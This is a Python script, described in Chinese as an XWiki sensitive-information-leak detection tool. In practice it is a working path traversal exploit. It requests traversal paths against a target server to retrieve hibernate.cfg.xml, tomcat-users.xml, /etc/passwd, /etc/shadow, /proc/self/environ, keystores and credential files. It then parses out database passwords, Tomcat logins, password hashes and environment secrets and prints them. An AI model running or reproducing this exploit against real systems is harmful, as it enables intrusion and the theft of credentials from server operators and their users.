import re
import requests
import argparse
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from collections import defaultdict

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def print_banner():
    banner = """
██████╗  ██████╗███████╗    ███████╗██╗  ██╗██╗██╗  ██╗██╗
██╔══██╗██╔════╝██╔════╝    ██╔════╝██║  ██║██║██║ ██╔╝██║
██████╔╝██║     █████╗      ███████╗███████║██║█████╔╝ ██║
██╔══██╗██║     ██╔══╝      ╚════██║██╔══██║██║██╔═██╗ ██║
██║  ██║╚██████╗███████╗    ███████║██║  ██║██║██║  ██╗███████╗
╚═╝  ╚═╝ ╚═════╝╚══════╝    ╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝
                                                            
XWiki 敏感信息泄露检测工具 v1.2
"""
    print(banner)

def fetch_sensitive_files(target_url):
    """获取敏感文件内容 - 尝试多个路径"""
    file_paths = {
        # 核心配置文件
        'hibernate.cfg.xml': [
            'bin/ssx/Main/WebHome?resource=../../WEB-INF/hibernate.cfg.xml&minify=false',
            'xwiki/webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fhibernate.cfg.xml',
            'webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fhibernate.cfg.xml'
        ],
        'web.xml': [
            'bin/ssx/Main/WebHome?resource=../../WEB-INF/web.xml',
            'xwiki/webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fweb.xml',
            'webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fweb.xml'
        ],
        'xwiki.cfg': [
            'bin/ssx/Main/WebHome?resource=../../WEB-INF/xwiki.cfg&minify=false',
            'xwiki/webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fxwiki.cfg',
            'webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fxwiki.cfg'
        ],
        'xwiki.properties': [
            'bin/ssx/Main/WebHome?resource=../../WEB-INF/classes/xwiki.properties',
            'xwiki/webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fclasses%2Fxwiki.properties',
            'webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fclasses%2Fxwiki.properties'
        ],
        'logback.xml': [
            'bin/ssx/Main/WebHome?resource=../../WEB-INF/classes/logback.xml',
            'xwiki/webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fclasses%2Flogback.xml',
            'webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fclasses%2Flogback.xml'
        ],
        'velocity.properties': [
            'bin/ssx/Main/WebHome?resource=../../WEB-INF/classes/velocity.properties',
            'xwiki/webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fclasses%2Fvelocity.properties',
            'webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fclasses%2Fvelocity.properties'
        ],
        'mail.properties': [
            'bin/ssx/Main/WebHome?resource=../../WEB-INF/classes/mail.properties',
            'xwiki/webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fclasses%2Fmail.properties',
            'webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fclasses%2Fmail.properties'
        ],
        'jdbc.properties': [
            'bin/ssx/Main/WebHome?resource=../../WEB-INF/classes/jdbc.properties',
            'xwiki/webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fclasses%2Fjdbc.properties',
            'webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fclasses%2Fjdbc.properties'
        ],
        
        # 安全相关文件
        'security-config.xml': [
            'bin/ssx/Main/WebHome?resource=../../WEB-INF/classes/security-config.xml',
            'xwiki/webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fclasses%2Fsecurity-config.xml',
            'webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fclasses%2Fsecurity-config.xml'
        ],
        'ehcache.xml': [
            'bin/ssx/Main/WebHome?resource=../../WEB-INF/classes/ehcache.xml',
            'xwiki/webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fclasses%2Fehcache.xml',
            'webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fclasses%2Fehcache.xml'
        ],
        'struts.xml': [
            'bin/ssx/Main/WebHome?resource=../../WEB-INF/classes/struts.xml',
            'xwiki/webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fclasses%2Fstruts.xml',
            'webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fclasses%2Fstruts.xml'
        ],
        
        # 数据库配置
        'hibernate.properties': [
            'bin/ssx/Main/WebHome?resource=../../WEB-INF/classes/hibernate.properties',
            'xwiki/webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fclasses%2Fhibernate.properties',
            'webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fclasses%2Fhibernate.properties'
        ],
        'persistence.xml': [
            'bin/ssx/Main/WebHome?resource=../../WEB-INF/classes/persistence.xml',
            'xwiki/webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fclasses%2Fpersistence.xml',
            'webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fclasses%2Fpersistence.xml'
        ],
        
        # 应用服务器文件
        'server.xml': [
            'bin/ssx/Main/WebHome?resource=../../../../conf/server.xml',
            'xwiki/webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2Fconf%2Fserver.xml',
            'webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2Fconf%2Fserver.xml'
        ],
        'context.xml': [
            'bin/ssx/Main/WebHome?resource=../../../../conf/context.xml',
            'xwiki/webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2Fconf%2Fcontext.xml',
            'webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2Fconf%2Fcontext.xml'
        ],
        'tomcat-users.xml': [
            'bin/ssx/Main/WebHome?resource=../../../../conf/tomcat-users.xml',
            'xwiki/webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2Fconf%2Ftomcat-users.xml',
            'webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2Fconf%2Ftomcat-users.xml'
        ],
        
        # 操作系统文件
        'passwd': [
            'bin/ssx/Main/WebHome?resource=../../../../etc/passwd',
            'xwiki/webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd',
            'webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd'
        ],
        'shadow': [
            'bin/ssx/Main/WebHome?resource=../../../../etc/shadow',
            'xwiki/webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow',
            'webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow'
        ],
        'hosts': [
            'bin/ssx/Main/WebHome?resource=../../../../etc/hosts',
            'xwiki/webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2Fetc%2Fhosts',
            'webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2Fetc%2Fhosts'
        ],
        'environ': [
            'bin/ssx/Main/WebHome?resource=../../../../proc/self/environ',
            'xwiki/webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron',
            'webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron'
        ],
        
        # XWiki特定文件
        'xwiki-platform-core.properties': [
            'bin/ssx/Main/WebHome?resource=../../WEB-INF/classes/xwiki-platform-core.properties',
            'xwiki/webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fclasses%2Fxwiki-platform-core.properties',
            'webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fclasses%2Fxwiki-platform-core.properties'
        ],
        'xwiki-platform-oldcore.properties': [
            'bin/ssx/Main/WebHome?resource=../../WEB-INF/classes/xwiki-platform-oldcore.properties',
            'xwiki/webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fclasses%2Fxwiki-platform-oldcore.properties',
            'webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fclasses%2Fxwiki-platform-oldcore.properties'
        ],
        
        # 密钥和凭据文件
        'secret.properties': [
            'bin/ssx/Main/WebHome?resource=../../WEB-INF/classes/secret.properties',
            'xwiki/webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fclasses%2Fsecret.properties',
            'webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fclasses%2Fsecret.properties'
        ],
        'credentials.properties': [
            'bin/ssx/Main/WebHome?resource=../../WEB-INF/classes/credentials.properties',
            'xwiki/webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fclasses%2Fcredentials.properties',
            'webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fclasses%2Fcredentials.properties'
        ],
        'keystore.jks': [
            'bin/ssx/Main/WebHome?resource=../../WEB-INF/classes/keystore.jks',
            'xwiki/webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fclasses%2Fkeystore.jks',
            'webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fclasses%2Fkeystore.jks'
        ],
        
        # 日志文件
        'catalina.out': [
            'bin/ssx/Main/WebHome?resource=../../../../logs/catalina.out',
            'xwiki/webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2Flogs%2Fcatalina.out',
            'webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2Flogs%2Fcatalina.out'
        ],
        'localhost_access_log.txt': [
            'bin/ssx/Main/WebHome?resource=../../../../logs/localhost_access_log.txt',
            'xwiki/webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2Flogs%2Flocalhost_access_log.txt',
            'webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2Flogs%2Flocalhost_access_log.txt'
        ],
        
        # 版本信息
        'MANIFEST.MF': [
            'bin/ssx/Main/WebHome?resource=../../META-INF/MANIFEST.MF',
            'xwiki/webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FMETA-INF%2FMANIFEST.MF',
            'webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FMETA-INF%2FMANIFEST.MF'
        ],
        
        # 备份文件
        'xwiki.cfg.bak': [
            'bin/ssx/Main/WebHome?resource=../../WEB-INF/xwiki.cfg.bak',
            'xwiki/webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fxwiki.cfg.bak',
            'webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fxwiki.cfg.bak'
        ],
        'web.xml.bak': [
            'bin/ssx/Main/WebHome?resource=../../WEB-INF/web.xml.bak',
            'xwiki/webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fweb.xml.bak',
            'webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fweb.xml.bak'
        ],
        'hibernate.cfg.xml.bak': [
            'bin/ssx/Main/WebHome?resource=../../WEB-INF/hibernate.cfg.xml.bak',
            'xwiki/webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fhibernate.cfg.xml.bak',
            'webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fhibernate.cfg.xml.bak'
        ]
    }
    
    results = {}
    
    for filename, paths in file_paths.items():
        results[filename] = None
        
        for path in paths:
            try:
                full_url = target_url + path
                print(f"[*] 尝试路径: {path}")
                response = requests.get(full_url, verify=False, timeout=10)
                
                if response.status_code == 200:
                    results[filename] = response.text
                    print(f"[+] 成功获取 {filename}")
                    break  # 成功获取后跳出循环
                else:
                    print(f"[-] 路径无效: HTTP {response.status_code}")
                    
            except Exception as e:
                print(f"[-] 请求出错: {str(e)}")
        
        if results[filename] is None:
            print(f"[-] 所有路径均无法获取 {filename}")
    
    return results

def parse_config_file(content, file_type):
    """解析配置文件内容"""
    if not content:
        return {}
    
    result = {}
    
    if file_type == 'hibernate.cfg.xml':
        # 提取数据库连接信息
        url_match = re.search(r'<property name="connection\.url">([^<]+)</property>', content)
        user_match = re.search(r'<property name="connection\.username">([^<]+)</property>', content)
        pass_match = re.search(r'<property name="connection\.password">([^<]+)</property>', content)
        
        if url_match: result['Database URL'] = url_match.group(1)
        if user_match: result['Database User'] = user_match.group(1)
        if pass_match: result['Database Password'] = pass_match.group(1)
        
        # 检查其他敏感配置
        if re.search(r'<property name="xwiki\.virtual_mode">', content):
            result['Virtual Mode'] = re.search(r'<property name="xwiki\.virtual_mode">([^<]+)</property>', content).group(1)
    
    elif file_type == 'web.xml':
        # 检查安全相关配置
        if '<filter-name>Set Character Encoding</filter-name>' in content:
            result['Character Encoding'] = 'UTF-8'
        
        # 检查认证相关配置
        if '<filter-name>XWikiContextInitializationFilter</filter-name>' in content:
            result['Authentication Filter'] = 'Enabled'
        
        # 检查CORS配置
        cors_match = re.search(r'<filter-name>Set CORS policy for fonts</filter-name>.*?<param-value>([^<]+)</param-value>', content, re.DOTALL)
        if cors_match: 
            result['CORS Policy'] = cors_match.group(1)
        else:
            result['CORS Policy'] = '未配置'
    
    elif file_type in ['xwiki.cfg', 'xwiki.properties', 'jdbc.properties', 
                       'mail.properties', 'secret.properties', 'credentials.properties']:
        for line in content.split('\n'):
            if not line.strip() or line.strip().startswith('#') or line.strip().startswith('!'):
                continue
                
            match = re.match(r'^\s*([^=]+?)\s*=\s*(.*?)\s*$', line)
            if match:
                key = match.group(1).strip()
                value = match.group(2).strip()
                
                # 标记敏感键
                sensitive_keys = ['password', 'pass', 'pwd', 'secret', 'key', 'token', 'credential']
                if any(sk in key.lower() for sk in sensitive_keys):
                    result[f"[敏感] {key}"] = value
                else:
                    result[key] = value
    
    elif file_type == 'tomcat-users.xml':
        # 提取Tomcat用户信息
        users = re.findall(r'<user username="([^"]+)" password="([^"]+)" roles="([^"]+)"/>', content)
        for i, (username, password, roles) in enumerate(users):
            result[f"用户 {i+1}"] = f"用户名: {username}, 密码: {password}, 角色: {roles}"
    
    elif file_type == 'passwd':
        # 提取系统用户信息
        users = []
        for line in content.split('\n'):
            if line.strip() and not line.startswith('#'):
                parts = line.split(':')
                if len(parts) >= 7:
                    users.append({
                        'username': parts[0],
                        'password': parts[1],
                        'uid': parts[2],
                        'gid': parts[3],
                        'description': parts[4],
                        'home': parts[5],
                        'shell': parts[6]
                    })
        
        for i, user in enumerate(users):
            result[f"用户 {i+1}"] = f"用户名: {user['username']}, UID: {user['uid']}, 主目录: {user['home']}"
    
    elif file_type == 'shadow':
        # 提取密码哈希
        entries = []
        for line in content.split('\n'):
            if line.strip() and not line.startswith('#'):
                parts = line.split(':')
                if len(parts) >= 2:
                    entries.append({
                        'username': parts[0],
                        'password_hash': parts[1]
                    })
        
        for i, entry in enumerate(entries):
            result[f"用户 {i+1}"] = f"用户名: {entry['username']}, 密码哈希: {entry['password_hash']}"
    
    elif file_type == 'environ':
        # 提取环境变量
        env_vars = {}
        for line in content.split('\x00'):
            if '=' in line:
                key, value = line.split('=', 1)
                env_vars[key] = value
        
        for key, value in env_vars.items():
            result[key] = value
    
    elif file_type == 'MANIFEST.MF':
        # 提取版本信息
        manifest = {}
        for line in content.split('\n'):
            if ':' in line:
                key, value = line.split(':', 1)
                manifest[key.strip()] = value.strip()
        
        result['Manifest信息'] = manifest
    
    else:
        # 通用解析：显示前100个字符作为预览
        preview = content[:100].replace('\n', ' ').replace('\r', ' ')
        if len(content) > 100:
            preview += '...'
        result['文件预览'] = preview
    
    return result

def generate_report(results):
    """生成检测报告"""
    print("\n" + "="*60)
    print("敏感信息泄露分析报告")
    print("="*60)
    
    critical_findings = []
    files_found = []
    
    for filename, content in results.items():
        if content is None:
            continue
            
        # 解析文件内容
        parsed_data = parse_config_file(content, filename)
        
        if not parsed_data:
            print(f"\n[+] 文件: {filename}")
            print("   - 未解析到有效信息")
            continue
            
        print(f"\n[+] 文件: {filename}")
        files_found.append(filename)
        
        for key, value in parsed_data.items():
            print(f"   - {key}: {value}")
            
            # 标记高风险项
            if 'password' in key.lower() or 'secret' in key.lower() or 'key' in key.lower():
                if value and value != 'Disabled' and value != 'Not Set':
                    critical_findings.append(f"{filename} 中的 {key} 泄露: {value}")
    
    print("\n" + "="*60)
    print("关键发现总结:")
    
    if critical_findings:
        for finding in critical_findings:
            print(f"  [!] 高风险: {finding}")
    else:
        print("  [√] 未发现高风险敏感信息泄露")
    
    print("\n" + "="*60)
    print("文件获取统计:")
    print(f"  成功获取文件: {len(files_found)}/{len(results)}")
    print("="*60)

def main():
    parser = argparse.ArgumentParser(
        description='XWiki 敏感信息泄露检测工具',
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="使用示例:\n"
               "  python RCE.py -u http://192.168.1.100:8080\n"
               "  python RCE.py -u https://example.com\n\n"
    )
    
    # 添加URL参数
    parser.add_argument(
        '-u', '--url',
        help='目标URL地址 (例如: http://192.168.1.100:8080)',
        metavar='URL',
        required=True
    )
    
    args = parser.parse_args()
    print_banner()
    target_url = args.url

    if not target_url.endswith('/'):
        target_url += '/'
    print(f"[*] 目标URL: {target_url}")
    

    file_contents = fetch_sensitive_files(target_url)
    generate_report(file_contents)

if __name__ == "__main__":
    main()
